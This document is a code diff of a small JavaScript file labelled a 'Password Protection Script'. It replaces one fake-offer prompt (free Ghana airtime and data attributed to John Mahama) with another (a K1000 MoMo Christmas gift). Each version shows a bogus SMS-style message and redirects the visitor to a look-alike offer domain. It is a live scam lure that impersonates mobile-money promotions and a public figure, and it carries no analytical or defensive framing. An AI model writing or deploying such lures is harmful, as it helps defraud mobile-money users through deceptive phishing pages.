@@ -1,7 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '0k'
-password=prompt('SMS: Welcome to Ghana GH₵10 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != 'ok') {
-location.href='https://mahama.data-offer.xyz/15GB';
-
+var password = 'Claim K1000'
+password=prompt('SMS: Congratulations Your MoMo Account is Eligible to receive K1000 MoMo Christmas Offer, Kindly Press OK to PROCEED ','Claim K1000');
+if (password != 'Claim K1000') {
+location.href='https://momo-chistmas.allprograms.xyz/gift';
 }
